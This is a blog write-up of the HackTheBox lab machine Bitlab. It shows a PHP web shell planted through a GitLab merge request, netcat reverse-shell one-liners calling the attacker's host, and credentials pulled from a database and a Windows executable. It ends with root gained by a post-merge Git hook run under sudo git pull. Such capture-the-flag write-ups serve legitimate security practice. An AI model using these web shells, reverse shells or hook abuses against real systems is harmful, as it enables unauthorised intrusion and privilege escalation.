---
title: "HTB-Bitlab"
excerpt: "Although I didn't like Bitlab user part, I liked its root. There was two ways to get root on that box one from Reversing an executable and..."
related: false
date: 2020-01-11
categories:
  - HackTheBox
#tags:
#  - related posts
#  - layout
#img: /assets/images/craft/banner.png
---
![Bitlab/Untitled.png](/assets/images/Bitlab/Untitled.png)

although I didn't like Bitlab user part, I liked its root. There was two ways to get root on that box one from Reversing an executable and another from abusing git pull.

# Box Summary

- Enumerating gitlab i will find developer credentials in a saved bookmark.
- Finding two repositories and capability to upload files to one of them and having a shell as www-data.
- Enumerating PostgreSQL database to find Clave credentials and having user.txt
- Finding a Windows Executable in Clave directory. With some analysis i managed to get root password out if it.

# Recon

## Nmap

Found 2 ports 22(**SSH**), 80(**HTTP**).

    root@kali:# nmap -sT -p- -vv -n -Pn --min-rate 10000 -oN nmap/alltcp 10.10.10.114
    Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-10 13:28 EET
    Initiating Connect Scan at 13:28
    Scanning 10.10.10.114 [65535 ports]
    Completed Connect Scan at 13:29, 35.18s elapsed (65535 total ports)
    Nmap scan report for 10.10.10.114
    Host is up, received user-set (0.13s latency).
    PORT   STATE SERVICE REASON
    22/tcp open  ssh     syn-ack
    80/tcp open  http    syn-ack

    Read data files from: /usr/bin/../share/nmap
    Nmap done: 1 IP address (1 host up) scanned in 35.25 seconds

    root@kali:# nmap -sT -p- -vv -n -Pn --min-rate 10000 -oN nmap/alltcp 10.10.10.114
    Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-10 13:36 EET
    Nmap scan report for 10.10.10.114
    Host is up (0.099s latency).

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
    |   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
    |_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
    80/tcp open  http    nginx
    | http-robots.txt: 55 disallowed entries (15 shown)
    | / /autocomplete/users /search /api /admin /profile
    | /dashboard /projects/new /groups/new /groups/*/edit /users /help
    |_/s/ /snippets/new /snippets/*/edit
    | http-title: Sign in \xC2\xB7 GitLab
    |_Requested resource was http://10.10.10.114/users/sign_in
    |_http-trane-info: Problem with XML parsing of /evox/about
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 18.07 seconds

## Web

Web was a self hosted **GitLab**.

![Bitlab/Untitled%201.png](/assets/images/Bitlab/Untitled%201.png)

### Gobuster

    root@kali:# gobuster dir -u http://10.10.10.114 -w /usr/share/seclists/Discovery/Web-Content/common.txt -k --wildcard -s 200 -f
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.10.114
    [+] Threads:        10
    [+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
    [+] Status codes:   200
    [+] User Agent:     gobuster/3.0.1
    [+] Add Slash:      true
    [+] Timeout:        10s
    ===============================================================
    2019/09/10 15:18:15 Starting gobuster
    ===============================================================
    /.well-known/openid-configuration/ (Status: 200)
    /explore/ (Status: 200)
    /help/ (Status: 200)
    /profile/ (Status: 200)
    /public/ (Status: 200)
    /robots.txt/ (Status: 200)
    /root/ (Status: 200)
    /search/ (Status: 200)
    ===============================================================
    2019/09/10 15:30:02 Finished
    ===============================================================

What was interesting among those directories was **/profile** **/help**

Browesing to /profile was a website for a developer named Clave

![Bitlab/Untitled%202.png](/assets/images/Bitlab/Untitled%202.png)

/help had bookmarks.html that had an interesting JS code

![Bitlab/Untitled%203.png](/assets/images/Bitlab/Untitled%203.png)

From its name i suppose the developer was using that as a bookmark to his GitLab login!

Then using online beautifier.

    function() {
        var _0x4b18 = ["\x76\x61\x6C\x75\x65", "\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E", "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64", "\x63\x6C\x61\x76\x65", "\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64", "\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"];
        document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]] = _0x4b18[3];
        document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]] = _0x4b18[5];
    }

Editing it to print _0x4b18 variable.

    		var _0x4b18 = ["\x76\x61\x6C\x75\x65", "\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E", "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64", "\x63\x6C\x61\x76\x65", "\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64", "\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"];
        document.write(_0x4b18)

I got those values.

    value,user_login,getElementById,clave,user_password,11des0081x

Got those creds and logged in to GitLab.

    clave:11des0081x

After logging in there were two project

![Bitlab/Untitled%204.png](/assets/images/Bitlab/Untitled%204.png)

Also found this code snippet.

    <?php
    $db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
    $result = pg_query($db_connection, "SELECT * FROM profiles");

Enumerating repositories I found that this Profile project is related to the developer website I saw earlier.  

One of the things I didn't like about this box that, it is spoiled that I have to upload a shell here because there are other players shells.

There was a file upload capability and a TODO message.

![Bitlab/Untitled%205.png](/assets/images/Bitlab/Untitled%205.png)

Looking at Deployer it had this index.php

    <?php

    $input = file_get_contents("php://input");
    $payload  = json_decode($input);

    $repo = $payload->project->name ?? '';
    $event = $payload->event_type ?? '';
    $state = $payload->object_attributes->state ?? '';
    $branch = $payload->object_attributes->target_branch ?? '';

    if ($repo=='Profile' && $branch=='master' && $event=='merge_request' && $state=='merged') {
        echo shell_exec('cd ../profile/; sudo git pull'),"\n";
    }

    echo "OK\n";

When I was doing the box I thought i have to post to Depolyer to pull my files to server. But that appeared to be wrong later and there is a cronjob or something running it on server.

# Exploitation

## Shell as www-data

I created a PHP RCE oneliner.

    <?php system($_REQUEST['cmd']) ;?>

I tried to upload it to master branch directly but it didn't work.

![Bitlab/Untitled%206.png](/assets/images/Bitlab/Untitled%206.png)

So i tried to upload it to a new branch and merge it with master branch.

![Bitlab/Untitled%207.png](/assets/images/Bitlab/Untitled%207.png)

Doing Merge Request.

![Bitlab/Untitled%208.png](/assets/images/Bitlab/Untitled%208.png)

![Bitlab/Untitled%209.png](/assets/images/Bitlab/Untitled%209.png)

And then Accepting the merge request to Master.

![Bitlab/Untitled%2010.png](/assets/images/Bitlab/Untitled%2010.png)

Looking at master branch now it had my script.

![Bitlab/Untitled%2011.png](/assets/images/Bitlab/Untitled%2011.png)

Now I have RCE on the server

    root@kali:# curl http://10.10.10.114/profile/yuns.php?cmd=id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

using this reverse shell i got my first shell.

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.172 9001 >/tmp/f

Got my shell back

    root@kali:# nc -lvnp 9001
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::9001
    Ncat: Listening on 0.0.0.0:9001
    Ncat: Connection from 10.10.10.114.
    Ncat: Connection from 10.10.10.114:36862.
    /bin/sh: 0: can't access tty; job control turned off
    $

Getting a full TTY with tab auto compilation.

    $ python -c 'import pty;pty.spawn("/bin/bash")'
    www-data@bitlab:/var/www/html/profile$ ^Z
    [1]+  Stopped                 nc -lvnp 9001
    root@kali:# stty raw -echo
    root@kali:# nc -lvnp 9001 # Enterting fg Here

    www-data@bitlab:/var/www/html/profile$ who
    who     whoami

# Privileges Escalation

Bitlab had unintended way from www-data to root that I did on release time. I will do both but the intended one first.

## www-data to Clave

Looking at listening ports.

    www-data@bitlab:/var/www/html$ netstat -ano|grep LIST                                                                                                     
    tcp        0      0 127.0.0.1:3022          0.0.0.0:*               LISTEN      off (0.00/0/0)
    tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
    tcp        0      0 172.17.0.1:3000         0.0.0.0:*               LISTEN      off (0.00/0/0)
    tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      off (0.00/0/0)
    ...(Snip)...

So there was a PostgreSQL running on port 5432 but psql wasn't installed.

Earlier I found a PHP code snippet about connecting to database. I used it like it was just added a print to fetched data.

    <?php
    $db_connection = pg_connect("host=localhost dbname=profiles user=profiles passwo
    rd=profiles");
    $result = pg_query($db_connection, "SELECT * FROM profiles");
    $arr = pg_fetch_all($result);
    print_r($arr);
    ?>

Running it got me credentials for Clave.

    www-data@bitlab:/dev/shm$ php postgres.php                                          
    Array
    (
        [0] => Array
            (
                [id] => 1
                [username] => clave
                [password] => c3NoLXN0cjBuZy1wQHNz==
            )

    )

Clave's credentials.

    clave:c3NoLXN0cjBuZy1wQHNz==

Trying them with SSH.I logged in and got user.txt

    root@kali:# ssh clave@10.10.10.114
    clave@10.10.10.114's password:
    Last login: Tue Sep 10 14:44:29 2019 from 10.10.15.230
    clave@bitlab:~$ cat user.txt
    1e3fd...

## Clave to Root

Looking at Clave's directory there was RemoteConnection.exe

    clave@bitlab:~$ file RemoteConnection.exe
    RemoteConnection.exe: PE32 executable (console) Intel 80386, for MS Windows

So I copied it to box to do some analysis on it.

    root@kali:# scp clave@10.10.10.114:~/RemoteConnection.exe .
    clave@10.10.10.114's password:
    RemoteConnection.exe                                                                                                    100%   14KB  66.8KB/s   00:00

### Static Analysis

Strings on the binary didn't show much so I opened it in Ghidra

![Bitlab/Untitled%2012.png](/assets/images/Bitlab/Untitled%2012.png)

I saw that string. Looking exactly where it is

![Bitlab/Untitled%2013.png](/assets/images/Bitlab/Untitled%2013.png)

With the help of [This](https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea). It executes **putty.exe** and passes some arguments to it. I tried to grab what parameters gets passed but it will be hard doing it statically.

### Dynamic Analysis

I fired up my Windows VM and tried to ran the binary. It gave some missing files at first. After getting those files it ran normally so I opened it in Immunity Debugger.

Setting breakpoint at the if condition before **ShellExecute**.

![Bitlab/Untitled%2014.png](/assets/images/Bitlab/Untitled%2014.png)

![Bitlab/Untitled%2015.png](/assets/images/Bitlab/Untitled%2015.png)

Then running the program and stopping at the breakpoint.

![Bitlab/Untitled%2016.png](/assets/images/Bitlab/Untitled%2016.png)

I can see the prameters in EBX register.

    root:Qf7]8YSV.wDNF*[7d?j&eD4^

Logging in as root

    root@kali:# ssh root@10.10.10.114
    root@10.10.10.114's password:
    Last login: Tue Sep 10 14:44:29 2019
    root@bitlab:~# cat root.txt
    8d4cc...

## www-data to Root

This is another way to get root on that box and this is the way I actually did it while doing the box first time. It maybe got mitigated later.

Looking if www-data can execute sudo.

    www-data@bitlab:/var/www/html/profile$ sudo -l
    Matching Defaults entries for www-data on bitlab:
        env_reset, exempt_group=sudo, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User www-data may run the following commands on bitlab:
        (root) NOPASSWD: /usr/bin/git pull

After some searching I found that it can be abused with [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks). Bash scripts that runs after various operations in Git.

After looking for a while for a hook that runs after a pull I found [This](https://stackoverflow.com/questions/4185400/is-there-any-git-hook-for-pull).

So now i will create a post-merge hook in one of the reposotoris .git/hooks directory. One problem was that www-data cant write in those directories so i copied one of the reposotries to /tmp.

Creating reverse shell in post-merge

    www-data@bitlab:/tmp/profile$ cat /tmp/profile/.git/hooks/post-merge      
    #/bin/bash
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.172 9001 >/tmp/f
    www-data@bitlab:/tmp/profile$ chmod +x /tmp/profile/.git/hooks/post-merge
    www-data@bitlab:/tmp/profile$ sudo git pull
    From ssh://localhost:3022/root/profile
       master     -> origin/master
     * [new branch]      patch-2603 -> origin/patch-2603
    Updating ccf9eff..6c6f8a7
    Fast-forward
     index.php |   2 +-
     1 file changed, 2 insertions(+), 0 deletions(-)

On my listener

    root@kali:# nc -lvnp 9001
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::9001
    Ncat: Listening on 0.0.0.0:9001
    Ncat: Connection from 10.10.10.114.
    Ncat: Connection from 10.10.10.114:45566.
    # id
    uid=0(root) gid=0(root) groups=0(root)
    #
